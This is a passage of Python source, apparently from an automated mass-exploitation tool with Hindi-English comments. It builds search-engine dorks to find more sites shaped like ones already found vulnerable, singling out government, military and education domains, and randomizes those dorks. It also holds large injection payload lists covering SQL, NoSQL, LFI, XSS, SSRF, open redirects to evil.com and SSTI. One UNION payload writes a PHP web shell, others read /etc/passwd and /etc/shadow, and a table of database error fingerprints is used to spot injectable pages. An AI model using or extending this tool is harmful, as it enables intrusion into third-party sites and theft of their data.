            R.append(lambda c, y=y, i=i: "%s %s %s" % (c, KW_SUF[i], y))
    for i in range(min(len(KW_QUAL), 6)):
        for j in range(min(len(KW_VERBS), 4)):
            for k in range(min(len(KW_NOUNS), 4)):
                R.append(lambda c, i=i, j=j, k=k:
                         "%s %s %s %s" % (KW_QUAL[i], KW_VERBS[j], c, KW_NOUNS[k]))
    return R


_KW_RECIPES = kw_recipes()


def make_keywords(items, n: int = 200, exclude=None) -> list:
    """HQ keyword generator v3 — variety ke saath, 100000 tak.

    Pehle sab recipes ek-ek core pe ghumte hain (pattern-major), isliye
    n chhota ho ya bada — output me har pattern aata hai, ek hi repeat nahi.
    """
    cores = kw_cores(items)
    if not cores:
        return []
    n = max(1, min(KW_HARD_MAX, int(n or 200)))
    seen = set(exclude or ())
    out = []
    seen_low = {str(x).lower() for x in seen}

    def add(x):
        x = " ".join(str(x).split())
        if not x or not (3 <= len(x) <= 70) or x in seen or x.lower() in seen_low:
            return False
        seen.add(x)
        seen_low.add(x.lower())
        out.append(x)
        return True

    # pass 1: recipe-major + core shift — lagatar items me pattern AUR core dono badalte
    R = _KW_RECIPES
    for b in range(0, len(R)):
        for ri in range(len(R)):
            if len(out) >= n:
                return out
            c = cores[(ri + b) % len(cores)]
            try:
                add(R[ri](c))
            except Exception:
                continue
    # pass 2: poore cross-products — 1 seed se bhi 20k+ nikalte hain
    for c in cores:
        for pre in KW_PRE:
            for suf in KW_SUF:
                add("%s %s %s" % (pre, c, suf))
        for pre in KW_PRE:
            for it in KW_INTENT:
                add("%s %s %s" % (pre, c, it))
        for suf in KW_SUF:
            for it in KW_INTENT:
                add("%s %s %s" % (c, suf, it))
        for pre in KW_PRE:
            for t in KW_TAIL:
                add("%s %s %s" % (pre, c, t))
        for t in KW_TAIL:
            for it in KW_INTENT:
                add("%s %s %s" % (c, t, it))
        for q in KW_QUAL:
            for nn in KW_NOUNS:
                add("%s %s %s" % (q, c, nn))
        for vb in KW_VERBS:
            add("%s %s" % (vb, c))
            for q in KW_QUAL:
                add("%s %s %s" % (vb, q, c))
        for g in KW_GEO:
            add("%s %s" % (c, g))
            for pre in KW_PRE[:8]:
                add("%s %s %s" % (pre, c, g))
        for sf in KW_SUFFIX2:
            for it in KW_INTENT:
                add("%s %s %s" % (c, sf, it))
        for y in KW_YEARS:
            for mod in KW_PRE + KW_SUF + KW_INTENT:
                add("%s %s %s" % (mod, c, y))
        if len(out) >= n:
            return out
    if len(out) >= n:
        return out
    # pass 3: 4-shabd (sabse bada pool)
    for c in cores:
        for pre in KW_PRE:
            for suf in KW_SUF:
                for it in KW_INTENT:
                    add("%s %s %s %s" % (pre, c, suf, it))
                    if len(out) >= n:
                        return out
    return out


def kw_quality(kws) -> dict:
    """Keyword quality report — buckets + avg + top/worst."""
    kws = list(kws or [])
    if not kws:
        return {"total": 0, "avg": 0.0, "top": [], "worst": []}
    pairs = [(score_keyword(k)[0], k) for k in kws]
    scores = [p[0] for p in pairs]
    b = {"b80": 0, "b65": 0, "b45": 0, "b25": 0, "b0": 0}
    for sc in scores:
        if sc >= 80:
            b["b80"] += 1
        elif sc >= 65:
            b["b65"] += 1
        elif sc >= 45:
            b["b45"] += 1
        elif sc >= 25:
            b["b25"] += 1
        else:
            b["b0"] += 1
    top = [k for _, k in sorted(pairs, key=lambda z: -z[0])[:10]]
    worst = [k for _, k in sorted(pairs, key=lambda z: z[0])[:5]]
    d = {"total": len(kws), "avg": sum(scores) / len(scores), "top": top, "worst": worst}
    d.update(b)
    return d


def score_keyword(kw: str) -> tuple:
    kw = (kw or "").strip().lower()
    if not kw:
        return 0, ["empty"]
    score, reasons = 50, []
    n = len(kw)
    if 8 <= n <= 45:
        score += 15
        reasons.append("+15 good length")
    elif n > 60:
        score -= 15
        reasons.append("-15 too long")
    elif n < 5:
        score -= 12
        reasons.append("-12 too short")
    w = kw.split()
    if 2 <= len(w) <= 5:
        score += 12
        reasons.append("+12 %d words (ideal for search)" % len(w))
    elif len(w) > 7:
        score -= 10
        reasons.append("-10 too many words")
    if re.search(r"\b(how|what|why|best|top|guide|review|price|buy|download)\b", kw):
        score += 10
        reasons.append("+10 intent word")
    if re.search(r"\d{4}", kw):
        score -= 5
        reasons.append("-5 year in name (goes stale)")
    if len(set(w)) < len(w) * 0.6:
        score -= 10
        reasons.append("-10 repeat words")
    if re.search(r"[^a-z0-9 \-]", kw):
        score -= 8
        reasons.append("-8 special char")
    return max(0, min(100, score)), reasons


# ── URL REVERSE ──────────────────────────────────────────────────────────────
def host_suffix(host: str) -> str:
    """example.com → com · site.gov.in → gov.in · shop.co.uk → co.uk"""
    parts = [x for x in str(host or "").lower().split(".") if x]
    if len(parts) >= 2 and parts[-2] in ("co", "com", "org", "net", "gov", "ac",
                                         "edu", "nic", "mil") and len(parts[-1]) == 2:
        return ".".join(parts[-2:])          # gov.in / co.uk
    return parts[-1] if parts else ""


def suffix_restricted(suf: str) -> bool:
    """Sirf sarkari/edu suffix hi target karo — .co.uk / .com bahut broad hain."""
    return str(suf or "").split(".")[0] in ("gov", "mil", "edu", "ac", "nic")


def url_reverse(url: str) -> dict:
    """URL ko toda + usse banaye ja sakne wale dorks."""
    raw = (url or "").strip()
    if not raw:
        return {}
    if "://" not in raw:
        raw = "http://" + raw
    try:
        u = urlparse(raw)
    except Exception:
        return {}
    host = (u.hostname or "").lower()
    parts = host.split(".")
    tld = ".".join(parts[-2:]) if len(parts) >= 2 else host
    path = u.path or "/"
    segs = [s for s in path.split("/") if s]
    fname = segs[-1] if segs else ""
    ext = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""
    dirs = segs[:-1]
    qs = parse_qs(u.query or "", keep_blank_values=True)
    params = list(qs.keys())
    return {
        "raw": raw, "host": host, "tld": tld, "sub": ".".join(parts[:-2]) if len(parts) > 2 else "",
        "path": path, "dirs": dirs, "file": fname, "ext": ext,
        "params": params, "values": {k: v[:1] for k, v in list(qs.items())[:15]},
    }


def url_reverse_dorks(info: dict, n: int = 20) -> list:
    if not info:
        return []
    out = []
    h, f, e, p = info.get("host", ""), info.get("file", ""), info.get("ext", ""), info.get("params", [])
    d = "/".join(info.get("dirs", [])[:2])
    if d:
        d += "/"
    if f:
        out.append("inurl:%s%s" % (d, f))
        out.append('inurl:"%s%s"' % (d, f))
        out.append("allinurl:%s%s" % (d, f))
    for prm in p:
        if f:
            out.append("inurl:%s%s?%s=" % (d, f, prm))
        out.append("inurl:%s=" % prm)
        out.append('inurl:"%s="' % prm)
    if e:
        out.append("filetype:%s" % e)
        out.append("filetype:%s inurl:%s" % (e, (f.rsplit(".", 1)[0] if f else "")))
    if h:
        out.append("site:%s" % h)
    suf = host_suffix(h)
    if suffix_restricted(suf):
        base = (f.rsplit(".", 1)[0] if f else (p[0] if p else ""))
        if base:
            out.append("site:.%s inurl:%s" % (suf, base))
    if p and f:
        out.append("inurl:%s?%s=" % (f, p[0]))
    return _uniq([x for x in out if x and "inurl:= " not in x])[:n]


COMMON_STEMS = ("product", "products", "item", "detail", "details", "page", "view",
                "news", "article", "blog", "post", "category", "cat", "shop",
                "store", "listing", "search", "download", "file", "report")


def vuln_reverse_dorks(urls, n: int = 90) -> list:
    """VULNERABLE URL → UHQ dorks (bina keywords).

    Logic: jo URL vulnerable nikla uska *shape* pakdo — same file name,
    same folder, same parameter, same extension, same TLD — aur wahi shape
    dhoondho doosri sites par. Keywords ki zarurat nahi, kyunki yahan
    target "same technology / same structure" hai, koi niche nahi.
    """
    out = []
    for raw in (urls or []):
        try:
            info = url_reverse(raw)
        except Exception:
            info = {}
        if not info:
            continue
        f = str(info.get("file") or "").strip()
        ext = str(info.get("ext") or "").strip().lstrip(".")
        params = [str(x) for x in (info.get("params") or []) if x][:4]
        dirs = [str(x) for x in (info.get("dirs") or []) if x][:3]
        host = str(info.get("host") or "").strip()
        suf = host_suffix(host)
        d = "/".join(dirs)
        if d:
            d += "/"
        stem = f.rsplit(".", 1)[0] if f else ""
        q = params[0] if params else ""

        # 1) exact shape — sabse high quality
        if f and q:
            out.append('inurl:"%s?%s="' % (f, q))
            out.append("inurl:%s?%s=" % (f, q))
        if d and f and q:
            out.append("inurl:%s%s?%s=" % (d, f, q))
            out.append("allinurl:%s%s %s=" % (d, f, q))
        # 2) file + params (bina folder)
        if f:
            for prm in params[:3]:
                out.append("inurl:%s?%s=" % (f, prm))
            if ext:
                out.append("inurl:%s ext:%s" % (stem, ext))
                out.append("inurl:%s ext:%s inurl:%s=" % (f, ext, q or "id"))
        # 3) same extension + same param (technology match)
        if ext and q:
            out.append("inurl:%s= ext:%s" % (q, ext))
            out.append('inurl:"%s=" ext:%s' % (q, ext))
        # 4) country suffix (gov.in / co.uk) — .com jaise broad suffix skip
        if suffix_restricted(suf) and f and q:
            out.append("site:.%s inurl:%s?%s=" % (suf, f, q))
            if ext:
                out.append("site:.%s inurl:%s= ext:%s" % (suf, q, ext))
        # 5) same folder shape
        if d and ext:
            out.append("inurl:%s ext:%s" % (d.strip("/"), ext))
        # 6) sibling file names — same CMS ke doosre pages
        if ext and q:
            for st in COMMON_STEMS[:16]:
                out.append("inurl:%s.%s?%s=" % (st, ext, q))
            for prm in params[1:3]:
                out.append("inurl:%s=%s" % (prm, ext))
        # 7) error-based — seedhe vulnerable pages (known technique)
        if f:
            out.append('intext:"You have an error in your SQL syntax" inurl:%s' % f)
            out.append('intext:"Warning: mysql_fetch" inurl:%s' % f)
        # 8) fallback — host ka shape
        if not (f and q) and host:
            out.append("site:%s" % host)
            if ext:
                out.append("site:%s ext:%s" % (".".join(host.split(".")[-2:]), ext))
    clean = []
    seen = set()
    for d in out:
        d = re.sub(r"\s+", " ", str(d or "")).strip()
        if not d or d in seen:
            continue
        if re.search(r"inurl:\s*[=?&]|inurl:\s*$|:\s*=", d):
            continue                      # adhoora dork nahi
        seen.add(d)
        clean.append(d)
    return clean[:max(10, int(n or 90))]


# ── RANDOMIZER ───────────────────────────────────────────────────────────────
OP_MUTATE = [
    ("inurl:", ["inurl:", "allinurl:", "intext:", "intitle:"]),
    ("site:", ["site:", "site:.com", "site:.net", "site:.org"]),
    ("filetype:", ["filetype:", "ext:"]),
]


def randomize_dorks(dorks: list, n: int = 30, mutate: bool = True) -> list:
    src = _uniq([d for d in (dorks or []) if d])
    if not src:
        return []
    n = max(1, min(1000, int(n or 30)))
    out = _uniq(list(src))
    if not mutate:
        out = out[:]
        while len(out) < n:
            out += src
        random.shuffle(out)
        return out[:n]

    seen = set(src)
    guard = 0
    while len(seen) < n and guard < n * 80:
        guard += 1
        d = random.choice(list(seen))
        m = d
        # 1) operator swap
        for op, reps in OP_MUTATE:
            if op in m.lower() and random.random() < 0.75:
                m = re.sub(re.escape(op), random.choice(reps), m, count=1, flags=re.I)
                break
        # 2) quotes
        if random.random() < 0.3:
            m = m.replace('"', "") if '"' in m else m.replace("inurl:", 'inurl:"', 1) + '"'
        # 3) param value
        if random.random() < 0.3:
            m = re.sub(r"=([A-Za-z0-9]*)", lambda z: "=" + random.choice(
                ["1", "2", "0", "a", "", "id", "test"]), m, count=1)
        # 4) tld swap
        if random.random() < 0.25 and re.search(r"site:\S+", m):
            m = re.sub(r"site:\S+", "site:." + random.choice(TLDS), m)
        if m != d and m not in seen:
            seen.add(m)
            out.append(m)
    out = _uniq(out)
    random.shuffle(out)
    return out[:n]


# ── INJECTOR ─────────────────────────────────────────────────────────────────
PAYLOAD_CATS = {
    "sqli": [
        "'",
        "\"",
        "')",
        "\")",
        "';",
        "\";",
        "1'",
        "1)",
        "1))",
        "1;",
        "1-- -",
        "1#",
        "' OR '1'='1",
        "' OR '1'='2",
        "\" OR \"1\"=\"1",
        "' OR 1=1-- -",
        "' OR 1=2-- -",
        "admin'-- -",
        "admin'#",
        "' or ''='",
        "\" or \"\"=\"",
        "') OR ('1'='1",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND SLEEP(5)",
        "1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)",
        "1' AND SLEEP(5)-- -",
        "1; SELECT SLEEP(5)",
        "1' WAITFOR DELAY '0:0:5'--",
        "1%27",
        "%27",
        "1%20AND%201=1",
        "1%20AND%201=2",
        "1%27%20OR%20%271%27=%271",
        "' AND extractvalue(1,concat(0x7e,version()))-- -",
        "' AND updatexml(1,concat(0x7e,user()),1)-- -",
        "' AND 1=CONVERT(int,@@version)-- -",
        "' AND 1=cast((select version()) as int)-- -",
        "' AND (SELECT 2*(IF(1=1,SLEEP(5),0)))-- -",
        "' RLIKE SLEEP(5)-- -",
        "' AND 1 LIKE 1-- -",
        "' AND 1 REGEXP 1-- -",
        "' AND JSON_EXTRACT('{}','$')-- -",
        "' AND GTID_SUBSET(@@version,0)-- -",
        "' AND ST_LatFromGeoHash(version())-- -",
        "1 OR NOT 1=1",
        "1 OR NOT 1=2",
        "1 XOR 1",
        "1 || 1",
        "1 && 1",
        "') AND 1=1-- -",
        "') AND 1=2-- -",
        "0x27",
        "char(39)",
        "||'1",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' ORDER BY 1-- -",
        "1' ORDER BY 50-- -",
        "1' GROUP BY 1-- -",
        "1' HAVING 1=1-- -",
    ],
    "blind": [
        "1 AND 1=1",
        "1 AND 1=2",
        "1 AND 2=2",
        "1 AND 2=3",
        "1 AND ASCII(SUBSTRING((SELECT database()),1,1))>64",
        "1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100",
        "1 AND LENGTH(database())>0",
        "1 AND LENGTH(database())>900",
        "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
        "1 AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'",
        "1 AND SLEEP(3)",
        "1 AND SLEEP(6)",
        "1 AND BENCHMARK(1000000,MD5(1))",
        "1' AND SLEEP(3)-- -",
        "1' AND SLEEP(6)-- -",
        "1) AND SLEEP(3)-- -",
        "1; WAITFOR DELAY '0:0:3'--",
        "1; WAITFOR DELAY '0:0:6'--",
        "1' AND 1=(SELECT 1 FROM PG_SLEEP(3))-- -",
        "1 AND 1=(SELECT 1 FROM PG_SLEEP(3))",
        "1' AND dbms_pipe.receive_message(('a'),3) IS NULL-- -",
        "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)",
        "1' AND (SELECT 1 FROM (SELECT SLEEP(3))a)-- -",
        "1 AND IF(1=1,SLEEP(3),0)",
        "1 AND IF(1=2,SLEEP(3),0)",
        "1 AND CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END",
        "1 AND CASE WHEN 1=2 THEN SLEEP(3) ELSE 0 END",
        "1 AND (SELECT COUNT(*) FROM mysql.user)>0",
        "1 AND 1 IN (SELECT 1)",
        "1 AND 1 NOT IN (SELECT 1)",
        "1 AND EXISTS(SELECT 1)",
        "1 AND NOT EXISTS(SELECT 1)",
        "1' AND ELT(1=1,1)-- -",
        "1' AND MAKE_SET(1=1,1)-- -",
        "1 AND 1=1 LIMIT 1",
        "1 AND 1=2 LIMIT 1",
        "1 AND true",
        "1 AND false",
        "1' AND '1' LIKE '1'-- -",
    ],
    "union": [
        "1 UNION SELECT NULL",
        "1 UNION SELECT NULL,NULL",
        "1 UNION SELECT NULL,NULL,NULL",
        "1 UNION SELECT NULL,NULL,NULL,NULL",
        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL",
        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL",
        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL",
        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
        "1 UNION ALL SELECT NULL,NULL,NULL",
        "1' UNION SELECT NULL-- -",
        "1' UNION SELECT NULL,NULL-- -",
        "1' UNION SELECT NULL,NULL,NULL-- -",
        "1' UNION ALL SELECT NULL,NULL-- -",
        "-1 UNION SELECT 1,2,3",
        "-1 UNION SELECT 1,version(),database()",
        "-1 UNION SELECT 1,user(),3",
        "-1 UNION SELECT 1,@@version,3",
        "-1' UNION SELECT 1,2,3-- -",
        "-1' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -",
        "1 UNION SELECT 1,2,CONCAT(user(),0x3a,database())",
        "1 UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables",
        "1 UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns",
        "1 UNION SELECT 1,2,LOAD_FILE('/etc/passwd')",
        "1 UNION SELECT 1,2,'<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/s.php'",
        "1 UNION SELECT NULL,table_name FROM information_schema.tables-- -",
        "1) UNION SELECT NULL-- -",
        "1) UNION SELECT NULL,NULL-- -",
        "1)) UNION SELECT NULL-- -",
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10",
        "1 ORDER BY 1",
        "1 ORDER BY 5",
        "1 ORDER BY 10",
        "1 ORDER BY 20",
        "1' ORDER BY 1-- -",
        "1' ORDER BY 10-- -",
        "1' ORDER BY 20-- -",
        "1 GROUP BY 1 ORDER BY 1",
        "1 UNION SELECT @@hostname,2,3",
        "1 UNION SELECT 1,@@datadir,3",
        "1 UNION SELECT 1,current_user,3",
        "1 UNION ALL SELECT 1,2,3,4",
        "-1 UNION ALL SELECT 1,2,3,4,5",
        "1 UNION DISTINCT SELECT NULL,NULL",
        "1' UNION SELECT 1,2,3--+-",
        "1 UNION SELECT 1,2,3#",
    ],
    "waf": [
        "'/**/OR/**/1=1-- -",
        "'/*!50000OR*/1=1-- -",
        "' %4fR 1=1-- -",
        "' oR 1=1-- -",
        "' Or 1=1-- -",
        "'||1=1-- -",
        "' || '1'='1",
        "%27%20OR%201%3D1--%20",
        "'+OR+1=1--+-",
        "'/**/AND/**/SLEEP(5)-- -",
        "' AND/**/1=1-- -",
        "' AND 1=1 LIMIT 1-- -",
        "' ANd 1=1#",
        "' AND 0x31=0x31-- -",
        "' AND TRUE-- -",
        "' AND !FALSE-- -",
        "' AND (1)=(1)-- -",
        "' AND (((1)))=(((1)))-- -",
        "' AND 1 BETWEEN 1 AND 1-- -",
        "' AND 1 IN(1)-- -",
        "' AND CONCAT('a','b')='ab'-- -",
        "' AND ASCII('a')=97-- -",
        "' AND CHAR(97)='a'-- -",
        "' AND HEX('a')=0x61-- -",
        "' AND MID('abc',1,1)='a'-- -",
        "' AND SUBSTR('abc',1,1)=0x61-- -",
        "' AND 1=1 /*",
        "' AND 1=1;%00",
        "' AND 1=1 --%0a",
        "' AND 1=1%23",
        "'%09AND%091=1",
        "'%0dAND%0d1=1",
        "' AND 1=1-- -&x=1",
        "' AND 1=1-- -'",
        "\\' AND 1=1-- -",
        "' AND 1=1 UN/**/ION SEL/**/ECT 1-- -",
        "' AND 1=1%0b-- -",
        "' AND 1=1%0c-- -",
        "' AND 1=1;-",
        "'<<AND 1=1>>",
    ],
    "nosql": [
        "{\"$gt\":\"\"}",
        "{\"$ne\":null}",
        "{\"$ne\":\"\"}",
        "{\"$gt\":\"0\"}",
        "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
        "{\"$or\":[{}]}",
        "{\"$or\":[{\"u\":\"a\"},{\"u\":\"b\"}]}",
        "{\"$regex\":\".*\"}",
        "{\"$exists\":true}",
        "{\"$where\":\"1==1\"}",
        "{\"$where\":\"this.a==this.a\"}",
        "{\"$nin\":[]}",
        "{\"$in\":[\"a\",\"b\"]}",
        "{\"$not\":{\"$eq\":1}}",
        "admin'||'1'=='1",
        "' || '1'=='1",
        "' && this.password.match(/.*/)//",
        "';return true;var x='",
        "'||1==1||'",
        "{$ne:1}",
        "[$ne]=1",
        "username[$ne]=admin&password[$ne]=admin",
        "user[$gt]=&pass[$gt]=",
        "{\"$comment\":\"x\"}",
        "{\"$jsonSchema\":{}}",
        "{\"$expr\":{\"$eq\":[1,1]}}",
        "{\"$function\":{\"body\":\"return true\"}}",
        "';sleep(5000);var x='",
    ],
    "graphql": [
        "query{__typename}",
        "{__schema{types{name}}}",
        "{__schema{queryType{name}}}",
        "query{__schema{mutationType{name}}}",
        "{__type(name:\"User\"){fields{name}}}",
        "{__type(name:\"Query\"){fields{name}}}",
        "query{users{id,email,password}}",
        "query{me{id,email,role}}",
        "mutation{login(email:\"a@b.c\",password:\"x\"){token}}",
        "{ user(id:1){ id email password } }",
        "query($id:Int!){user(id:$id){id,email}}",
        "query{__schema{directives{name}}}",
        "query{__schema{types{name,fields{name,type{name}}}}}",
        "{\"query\":\"{__typename}\"}",
        "{\"query\":\"{__schema{types{name}}}\"}",
        "{a:__typename b:__typename}",
        "query Q{__typename}",
        "fragment F on Query{__typename} query{...F}",
        "{__schema{subscriptionType{name}}}",
        "{__type(name:\"__Schema\"){name}}",
        "{__typename} query{__typename}",
        "query{__schema{types{name kind}}}",
        "query{__schema{description}}",
        "mutation{__typename}",
        "{ __schema { types { fields { args { name } } } } }",
    ],
    "lfi": [
        "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd", "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index",
        "php://filter/read=convert.base64-encode/resource=config",
        "/proc/self/environ", "C:\\Windows\\win.ini",
        "..\\..\\..\\windows\\win.ini", "/etc/hosts",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "file:///etc/passwd",
        "/etc/shadow", "/proc/self/cmdline", "/var/log/auth.log",
        "/WEB-INF/web.xml", "../../../../../../../../etc/passwd%00",
        "..%252f..%252f..%252fetc%252fpasswd",
    ],
    "xss": [
        "<script>alert(1)</script>", '"><script>alert(1)</script>',
        "'><svg onload=alert(1)>", "javascript:alert(1)",
        "%3Cscript%3Ealert(1)%3C/script%3E", "\"><img src=x onerror=alert(1)>",
        "'-alert(1)-'", "\"><svg/onload=alert(1)>",
        "\"><body onload=alert(1)>", "<img src=x onerror=prompt(1)>",
        "\";alert(1);//", "'</script><script>alert(1)</script>",
        "<svg><script>alert(1)</script>", "&lt;script&gt;alert(1)&lt;/script&gt;",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost",
        "http://169.254.169.254/latest/meta-data/", "http://[::1]",
        "http://0.0.0.0", "http://127.0.0.1:22", "http://127.0.0.1:80",
        "file:///etc/passwd", "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO", "http://127.1",
        "http://0177.0.0.1", "http://2130706433", "http://localtest.me",
    ],
    "redirect": [
        "https://evil.com", "//evil.com", "https://evil.com/%2f..",
        "/\\evil.com", "https://evil.com?x=1", "///evil.com",
        "http://evil.com@target.com", "https://target.com@evil.com",
        "//evil.com/%2f%2f", "https:evil.com", "\\evil.com",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}",
        "{{config}}", "{{self.__class__}}", "${{7*7}}",
        "${{'7'*7}}", "{{7*7}}${7*7}", "@(7*7)", "*{7*7}",
        "#{7*7}${7*7}", "{{cycler.__init__.__globals__}}",
    ],
}
PAYLOADS = _uniq([x for v in PAYLOAD_CATS.values() for x in v])
SQLI_FAMILY = ("sqli", "blind", "union", "waf", "nosql", "graphql")
PARAM_FUZZ = ["id", "page", "cat", "item", "product_id", "user", "file", "path",
              "url", "search", "q", "s", "id_product", "view", "news", "lang", "pid"]
CAT_LABEL = {"all": "🎯 ALL", "sqli": "💉 SQLi", "blind": "🕶 BLIND",
             "union": "🔗 UNION", "waf": "🛡 WAF BYPASS", "nosql": "🍃 NoSQL",
             "graphql": "🔺 GraphQL", "lfi": "📂 LFI", "xss": "🧪 XSS",
             "ssrf": "🌐 SSRF", "redirect": "↪️ REDIRECT", "ssti": "🧬 SSTI"}


# ── DBMS error fingerprints — 15+ databases, 235+ patterns ────────────────
DBMS_ERRORS = {
    "MySQL": ["You have an error in your SQL syntax", "check the manual that corresponds to your MySQL",
              "Warning: mysql_", "Warning: mysqli_", "MySQL server version for the right syntax",
              "supplied argument is not a valid MySQL", "mysql_fetch_array()",
              "mysql_num_rows()", "MySqlException", "SQLSTATE[HY000]"],
    "MariaDB": ["MariaDB server version", "check the manual that corresponds to your MariaDB",
                "Incorrect table name", "Unknown column", "You have an error in your SQL"],
    "PostgreSQL": ["PostgreSQL query failed", "pg_query()", "pg_exec()", "Warning: pg_",
                   "ERROR: syntax error at or near", "unterminated quoted string",
                   "invalid input syntax for integer", "current transaction is aborted",
                   "PSQLException", "ERROR: column"],
    "MSSQL": ["Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark after the character string",
              "Incorrect syntax near", "mssql_query()", "ODBC SQL Server Driver",
              "SQLServer JDBC Driver", "System.Data.SqlClient.SqlException",
              "Conversion failed when converting", "Must declare the scalar variable"],
    "Oracle": ["ORA-00933", "ORA-00921", "ORA-01756", "ORA-00942", "ORA-00907",
               "ORA-00936", "ORA-06512", "Oracle error", "quoted string not properly terminated",
               "ORA-01400", "ORA-01747", "ORA-00904: invalid identifier"],
    "SQLite": ["SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException",
               "sqlite3.OperationalError", "near \": syntax error", "unrecognized token",
               "SQLITE_ERROR", "no such table", "no such column"],
    "MongoDB": ["MongoError", "E11000 duplicate key error", "MongoServerError",
                "failed to parse", "Invalid BSON", "topology", "Cannot read property",
                "'$where' is not allowed", "Cast to ObjectId failed"],
    "Cassandra": ["InvalidRequestException", "cassandra", "UnavailableException",
                  "CassandraInvalidQueryException", "SyntaxException"],
    "CouchDB": ["{\"error\":\"bad_request\"}", "no_db_file", "couchdb",
                "invalid_json", "CouchDB"],
    "Redis": ["NOAUTH Authentication required", "WRONGTYPE Operation against",
              "ERR wrong number of arguments", "redis.clients.jedis"],
    "Firebird": ["Dynamic SQL Error", "isc_", "Firebird", "gbak:", "unavailable database"],
    "DB2": ["DB2 SQL error", "SQLCODE", "SQLSTATE=", "com.ibm.db2", "CLI0111E"],
    "Informix": ["Informix", "IX000", "-2[01]", "SQLCODE=-", "ifx_"],
    "Sybase": ["Sybase message", "Adaptive Server", "sybase", "ct_result"],
    "Teradata": ["Teradata", "TeraJDBC", "3706", "Teradata Database"],
    "MS Access": ["Microsoft Access Driver", "Microsoft JET Database", "ADODB.Field",
                  "Jet Database Engine", "ODBC Microsoft Access"],
    "H2": ["org.h2.jdbc", "H2 database", "JdbcSQLException", "Syntax error in SQL statement"],
    "HSQLDB": ["org.hsqldb", "HSQLDB", "sqltool", "Unexpected token"],
    "ClickHouse": ["ClickHouse", "Code: 62. DB::Exception", "DB::Exception"],
    "Snowflake": ["Snowflake", "SQL compilation error", "002003"],
    "BigQuery": ["google.api_core", "BigQuery", "Standard SQL syntax error"],
}
# extra fingerprints — 235+ total
_DBMS_EXTRA = {
    "MySQL": ["Illegal mix of collations", "Duplicate entry", "Cannot add or update a child row",
              "Lock wait timeout exceeded", "Incorrect string value", "Subquery returns more than 1 row",
              "Unknown prepared statement handler"],
    "MariaDB": ["Bad handshake", "Unknown database", "Table doesn't exist",
                "Commands out of sync", "Duplicate column name"],
    "PostgreSQL": ["relation \" does not exist", "operator does not exist", "division by zero",
                   "invalid byte sequence for encoding", "duplicate key value violates",
                   "value too long for type", "FEHLER"],
    "MSSQL": ["Incorrect syntax near the keyword", "Invalid object name",
              "The conversion of a varchar data type", "Violation of PRIMARY KEY constraint",
              "String or binary data would be truncated", "An expression of non-boolean type"],
    "Oracle": ["ORA-01722", "ORA-01858", "ORA-00932", "ORA-01036", "ORA-12541",
               "ORA-28000", "ORA-00911: invalid character"],
    "SQLite": ["SQL logic error", "near \"1\": syntax error", "database is locked",
               "table has no column named", "datatype mismatch", "SQLiteException"],
    "MongoDB": ["MongoCursorNotFoundException", "NamespaceNotFound", "OperationFailure",
                "WriteConflict", "Authentication failed", "BSONTypeError"],
    "Cassandra": ["ConfigurationException", "ReadTimeoutException", "AlreadyExistsException",
                  "cqlsh", "Unable to complete the operation"],
    "CouchDB": ["{\"error\":\"not_found\"}", "{\"error\":\"conflict\"}", "couchdb_httpd",
                "os_process_error"],
    "Redis": ["ERR unknown command", "READONLY You can't write against",
              "ERR value is not an integer", "LOADING Redis is loading"],
    "Firebird": ["SQL error code = -", "conversion error from string", "attempt to store duplicate value",
                 "arithmetic exception", "Database not found"],
    "DB2": ["SQL0206N", "SQL0802N", "SQL0420N", "DB2 SQL Error: SQLCODE=-", "IBM Data Server"],
    "Informix": ["IX000: ", "-217: ", "-201: ", "Informix ODBC Driver"],
    "Sybase": ["ASE is now", "ct_connect", "Sybase.Client", "Msg 102, Level 15"],
    "Teradata": ["3707", "3807", "TeraGSS", "Teradata JDBC Driver", "3523"],
    "MS Access": ["Syntax error in INSERT INTO statement", "Too few parameters",
                  "Operation must use an updateable query", "Microsoft Office Access"],
    "H2": ["JdbcSQLSyntaxErrorException", "Column \" not found", "Table not found"],
    "HSQLDB": ["org.hsqldb.jdbc", "java.sql.SQLSyntaxErrorException: user lacks privilege",
               "Unexpected end of statement"],
    "ClickHouse": ["Code: 47. DB::Exception", "Missing columns", "Syntax error: failed at position"],
    "Snowflake": ["002140", "100038", "SQL execution error", "Invalid identifier"],
    "BigQuery": ["400 Syntax error", "Unrecognized name", "BadRequest", "missing dataset"],
}
_DBMS_EXTRA2 = {
    "MySQL": ["Error 1045 (28000): Access denied", "Error 1064", "Error 1146",
              "Error 1452", "Error 1213"],
    "PostgreSQL": ["FATAL: password authentication failed", "ERROR: invalid regular expression",
                   "PSQLException: ERROR"],
